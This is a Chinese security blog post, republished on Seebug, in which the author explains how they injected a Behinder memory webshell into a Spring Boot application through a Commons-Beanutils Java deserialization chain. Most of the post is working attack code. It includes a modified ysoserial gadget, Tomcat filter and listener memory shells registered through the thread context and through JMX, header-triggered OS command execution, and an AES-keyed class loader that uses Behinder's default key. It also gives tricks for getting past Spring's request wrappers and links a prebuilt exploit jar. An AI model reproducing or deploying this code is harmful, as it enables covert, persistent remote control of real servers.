**作者：Y4er**  
**原文链接：<https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/>**

朋友叫帮忙打一个内存马进去，用的是cb链，无cc依赖，我寻思这不是有手就行吗，谁知道接下来遇到了无数的坑。

## 改造cb链去除cc依赖

这个是p牛讲过的了，不多说，直接贴代码

    
    
    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
    
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
    
        Reflections.setFieldValue(comparator, "property", "outputProperties");
    
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;
    
        return queue;
    }

用`String.CASE_INSENSITIVE_ORDER`替换掉cc的`org.apache.commons.collections.comparators.ComparableComparator`。

然后是内存马的地方，修改了`ysoserial.payloads.util.Gadgets`的createTemplatesImpl来加载自定义的class文件。

    
    
    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();
        Class tplClass;
        Class abstTranslet;
        Class transFactory;
    
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            tplClass = TemplatesImpl.class;
            abstTranslet = AbstractTranslet.class;
            transFactory = TransformerFactoryImpl.class;
        }
    
        if (command.startsWith("CLASS:")) {
            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
        } else if (command.startsWith("FILE:")) {
            byte[] bs = Files.readBytes(new File(command.substring(5)));
            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
        } else {
            if (command.startsWith("CMD:")) command = command.substring(4);
            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
        }
    }
    
    
    public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = new byte[0];
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass superC = pool.get(abstTranslet.getName());
        CtClass ctClass;
        if (command != null) {
            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            String cmd = "cmd = \"" + command + "\";";
            ctClass.makeClassInitializer().insertBefore(cmd);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }
        if (myClass != null) {
            // CLASS:
            if (myClass.getName().contains("SpringInterceptorMemShell")) {
                // memShellClazz
                ctClass = pool.get(myClass.getName());
                // 修改b64字节码
                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
                ctClass.setSuperclass(superC);
                classBytes = ctClass.toBytecode();
            } else {
                classBytes = ClassFiles.classAsBytes(myClass);
            }
        }
        if (bytes != null) {
            // FILE:
            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < bytes.length; i++) {
                sb.append(bytes[i]);
                if (i != bytes.length - 1) sb.append(",");
            }
            String content = "bs = new byte[]{" + sb + "};";
            // System.out.println(content);
            ctClass.makeClassInitializer().insertBefore(content);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }
    
    
        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});
    
        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

接下来就是static写注册servlet、filter的代码了。写一个servlet/filter继承AbstractTranslet并且实现对应接口和方法。目标是springboot的，我寻思写个tomcat
filter就能整。

    
    
    public class TomcatFilterMemShellFromThread extends AbstractTranslet implements Filter {
        static {
            try {
                final String name = "MyFilterVersion" + System.nanoTime();
                final String URLPattern = "/*";
    
                WebappClassLoaderBase webappClassLoaderBase =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    
                Class<? extends StandardContext> aClass = null;
                try {
                    aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
                    aClass.getDeclaredField("filterConfigs");
                } catch (Exception e) {
                    aClass = (Class<? extends StandardContext>) standardContext.getClass();
                    aClass.getDeclaredField("filterConfigs");
                }
                Field Configs = aClass.getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);
    
                TomcatFilterMemShellFromThread behinderFilter = new TomcatFilterMemShellFromThread();
    
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(behinderFilter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(behinderFilter.getClass().getName());
                /**
                 * 将filterDef添加到filterDefs中
                 */
                standardContext.addFilterDef(filterDef);
    
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern(URLPattern);
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
    
                standardContext.addFilterMapBefore(filterMap);
    
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
    
                filterConfigs.put(name, filterConfig);
            } catch (Exception e) {
    //            e.printStackTrace();
            }
        }
    ...
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
                if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                    response.getWriter().println("error");
                    return;
                }
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

按理说这样绝对没问题，事实证明确实没问题，访问内存马输出了error。接下来向里写冰蝎的马，这也是第一个坑。我的内存马如下

    
    
    @Override
    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        try {
            HttpServletRequest request = (HttpServletRequest) req;
            HttpServletResponse response = (HttpServletResponse) resp;
            HttpSession session = request.getSession();
    
            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
    
            if (request.getMethod().equals("GET")) {
                String cmd = request.getHeader("cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    String[] cmds = null;
                    if (File.separator.equals("/")) {
                        cmds = new String[]{"/bin/sh", "-c", cmd};
                    } else {
                        cmds = new String[]{"cmd", "/c", cmd};
                    }
                    String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                    response.getWriter().println(result);
                }
            } else if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                if (request.getMethod().equals("POST")) {
                    String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                    session.putValue("u", k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
    
                    //revision BehinderFilter
                    Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                    Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                    evilclass.newInstance().equals(pageContext);
                }
            }
        } catch (Exception e) {
    //            e.printStackTrace();
        }
    }

问题来了，cmdshell可以输出响应结果，而连接冰蝎总是报`request.getReader().readLine()`空指针。这是我踩得第一个坑。

## 包装类问题

目标环境是springboot2.0.9，内嵌tomcat。思来想去不应该`request.getReader().readLine()`空指针啊，然后一步一步在调，发现service中获取的参数是经过了包装的类。我这里用springboot模拟一个包装类。在MyFilter中

    
    
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        ContentCachingResponseWrapper responseWrapper = new ContentCachingResponseWrapper((HttpServletResponse) response);
        ContentCachingRequestWrapper requestWrapper = new ContentCachingRequestWrapper((HttpServletRequest) request);
        chain.doFilter(requestWrapper, responseWrapper);
        responseWrapper.copyBodyToResponse();
    }

向下传递的是经过ContentCaching包装的request和response。然后再另一个filter中，尝试`request.getReader().readLine()`确实报了空指针，导致冰蝎连不上。

![1.png](https://images.seebug.org/content/images/2022/04/18/1650264234000-1knpwk.png-w331s)

然后我寻思我反射从从coyoteRequest中拼接body参数传递给冰蝎aes解密的decodeBuffer`c.doFinal(new
sun.misc.BASE64Decoder().decodeBuffer(payload))`
拼接完之后payload能正常获取了，也能正常解密了，然后`evilclass.newInstance().equals(pageContext)`的equals又出错了。

![2.png](https://images.seebug.org/content/images/2022/04/18/1650264235000-2owdvj.png-w331s)

报了一个没有setCharacterEncoding方法。看了一下冰蝎的源码，发现`net.rebeyond.behinder.payload.java.Echo#fillContext`会进行反射调用setCharacterEncoding，但是ContentCachingResponseWrapper没有这个函数

![3.png](https://images.seebug.org/content/images/2022/04/18/1650264236000-3njcao.png-w331s)

除了这个地方，我又发现`org.springframework.web.util.ContentCachingResponseWrapper.ResponseServletOutputStream#ResponseServletOutputStream的write`函数重载没有只传入一个byte[]参数的

![4.png](https://images.seebug.org/content/images/2022/04/18/1650264238000-4fwocs.png-w331s)

所以这个地方也会报错，导致冰蝎第一个请求包响应内容为空，进而导致连不上。

发现问题就解决问题。想过改冰蝎的class，但是工程量有点大，想了想还是改改内存马，不是包装类吗，我就拆了你的包装。

    
    
    Object lastRequest = request;
    Object lastResponse = response;
    // 解决包装类RequestWrapper的问题
    // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
    if (!(lastRequest instanceof RequestFacade)) {
        Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
        lastRequest = getRequest.invoke(request);
        while (true) {
            if (lastRequest instanceof RequestFacade) break;
            lastRequest = getRequest.invoke(lastRequest);
        }
    }
    // 解决包装类ResponseWrapper的问题
    if (!(lastResponse instanceof ResponseFacade)) {
        Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
        lastResponse = getResponse.invoke(response);
        while (true) {
            if (lastResponse instanceof ResponseFacade) break;
            lastResponse = getResponse.invoke(lastResponse);
        }
    }
    HttpSession session = ((RequestFacade) lastRequest).getSession();
    pageContext.put("request", lastRequest);
    pageContext.put("response", lastResponse);
    pageContext.put("session", session);

给冰蝎传的都是拆了包装的，这样解决了冰蝎class的问题，但是还有`request.getReader().readLine()`为空的问题。我是这么解决的，贴代码

    
    
    String payload = request.getReader().readLine();
    if (payload == null || payload.isEmpty()) {
        payload = "";
        // 拿到真实的Request对象而非门面模式的RequestFacade
        Field field = lastRequest.getClass().getDeclaredField("request");
        field.setAccessible(true);
        Request realRequest = (Request) field.get(lastRequest);
        // 从coyoteRequest中拼接body参数
        Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
        coyoteRequestField.setAccessible(true);
        org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
        Parameters parameters = coyoteRequest.getParameters();
        Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
        paramHashValues.setAccessible(true);
        LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);
    
        Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
        while (iterator.hasNext()) {
            Map.Entry<String, ArrayList<String>> next = iterator.next();
            String paramKey = next.getKey().replaceAll(" ", "+");
            ArrayList<String> paramValueList = next.getValue();
            String paramValue = paramValueList.get(0);
            if (paramValueList.size() == 0) {
                payload = payload + paramKey;
            } else {
                payload = payload + paramKey + "=" + paramValue;
            }
        }
    }
    
    System.out.println(payload);

需要注意这里判断payload是否为空，是因为在springboot2.6.3测试时`request.getReader().readLine()`可以获取到payload而采取拼接的话为空，而2.0.9.RELEASE只能采用拼接参数的形式。

到此解决了冰蝎连接的问题，但是实战中并不是这么思路明确的，踩坑过程

  1. 通过jmx注册filter，发现cmdshell都没有
  2. 通过线程注册filter，cmdshell可以 冰蝎连不上
  3. 猜测是spring的问题，于是我又试了spring的拦截器，发现cmd可以冰蝎还是不行。
  4. 最后硬调发现是包装类的问题，解决payload==null的问题。

## springboot中的jmx名称

此时扭过头来看jmx注册servlet、filter，我在本地的tomcat发现可以成功，但是拿到springboot不行。先贴tomcat成功，springboot失败的代码

    
    
    static {
        try {
            String filterName = "MyFilterVersion" + System.nanoTime();
            String urlPattern = "/*";
    
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);
    
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);
    
            Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
    
            for (NamedObject namedObject : objectSet) {
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);
    
                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(obj);
    
                field = standardContext.getClass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
    
                if (map.get(filterName) == null) {
                    //生成 FilterDef
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterDefClass = null;
                    try {
                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    } catch (ClassNotFoundException e) {
                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                    }
    
                    Object filterDef = filterDefClass.newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
                    Filter filter = new TomcatFilterMemShellFromJMX();
    
                    filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
                    standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);
    
                    //设置 FilterMap
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterMapClass = null;
                    try {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    } catch (ClassNotFoundException e) {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    }
    
                    Object filterMap = filterMapClass.newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
                    //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
    
                    //设置 FilterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                    map.put(filterName, filterConfig);
                }
            }
        } catch (Exception e) {
    //            e.printStackTrace();
        }
    }

在springboot动态调试之后发现`Set<NamedObject> objectSet = repository.query(new
ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"),
null)`为空集，于是在springboot中寻找jmx对象，发现名字改为了Tomcat而非Catalina，于是加一个if判断就解决了

    
    
    if (objectSet.size() == 0) {
        // springboot的jmx中为Tomcat而非Catalina
        objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
    }

## Listener内存马

Listener内存马不存在包装类问题，可以直接写，感觉还是这个比较稳。

    
    
    package ysoserial.payloads.templates;
    
    import com.sun.jmx.mbeanserver.NamedObject;
    import com.sun.jmx.mbeanserver.Repository;
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import org.apache.catalina.connector.Request;
    import org.apache.catalina.connector.RequestFacade;
    import org.apache.catalina.connector.Response;
    import org.apache.catalina.core.StandardContext;
    import org.apache.tomcat.util.modeler.Registry;
    
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    import javax.management.DynamicMBean;
    import javax.management.MBeanServer;
    import javax.management.ObjectName;
    import javax.servlet.ServletRequestEvent;
    import javax.servlet.ServletRequestListener;
    import javax.servlet.http.HttpSession;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.Scanner;
    import java.util.Set;
    
    public class TomcatListenerMemShellFromJMX extends AbstractTranslet implements ServletRequestListener {
        static {
            try {
                MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
                Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
                field.setAccessible(true);
                Object obj = field.get(mbeanServer);
    
                field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
                field.setAccessible(true);
                Repository repository = (Repository) field.get(obj);
    
                Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
                if (objectSet.size() == 0) {
                    // springboot的jmx中为Tomcat而非Catalina
                    objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
                }
    
                for (NamedObject namedObject : objectSet) {
                    DynamicMBean dynamicMBean = namedObject.getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);
    
                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(obj);
    
                    TomcatListenerMemShellFromJMX listener = new TomcatListenerMemShellFromJMX();
                    standardContext.addApplicationEventListener(listener);
                }
            } catch (Exception e) {
    //            e.printStackTrace();
            }
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    
        }
    
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
    // Listener马没有包装类问题
            try {
                RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
                Field f = requestFacade.getClass().getDeclaredField("request");
                f.setAccessible(true);
                Request request = (Request) f.get(requestFacade);
                Response response = request.getResponse();
                // 入口
                if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                    // cmdshell
                    if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                        String cmd = request.getHeader("cmd");
                        if (cmd != null && !cmd.isEmpty()) {
                            String[] cmds = null;
                            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                cmds = new String[]{"cmd", "/c", cmd};
                            } else {
                                cmds = new String[]{"/bin/bash", "-c", cmd};
                            }
                            String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                            response.resetBuffer();
                            response.getWriter().println(result);
                            response.flushBuffer();
                            response.finishResponse();
                        }
                    } else if (request.getHeader("x-client-data").equalsIgnoreCase("rebeyond")) {
                        if (request.getMethod().equals("POST")) {
                            // 创建pageContext
                            HashMap pageContext = new HashMap();
    
                            // lastRequest的session是没有被包装的session!!
                            HttpSession session = request.getSession();
                            pageContext.put("request", request);
                            pageContext.put("response", response);
                            pageContext.put("session", session);
                            // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                            String payload = request.getReader().readLine();
    
    //                        System.out.println(payload);
                            // 冰蝎逻辑
                            String k = "e45e329feb5d925b"; // rebeyond
                            session.putValue("u", k);
                            Cipher c = Cipher.getInstance("AES");
                            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                            Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                            method.setAccessible(true);
                            byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                            Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                            evilclass.newInstance().equals(pageContext);
                        }
                    } else {
                        response.resetBuffer();
                        response.getWriter().println("error");
                        response.flushBuffer();
                        response.finishResponse();
                    }
                }
            } catch (Exception e) {
    //            e.printStackTrace();
            }
        }
    }

## 总结

解决了springboot包装类和从jmx中拿到StandardContext的问题，写了servlet、filter、listener、Spring
Interceptor内存马发现Listener内存马兼容性更强，

因为这一个内存马，我和朋友 @汤姆 连着一星期3点睡觉7点起，感觉阎王快夸我好身体了……

打包好的jar包在 <https://ysoserial.y4er.com/ysoserial-0.0.6-SNAPSHOT-all.jar> 下载

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1883/>

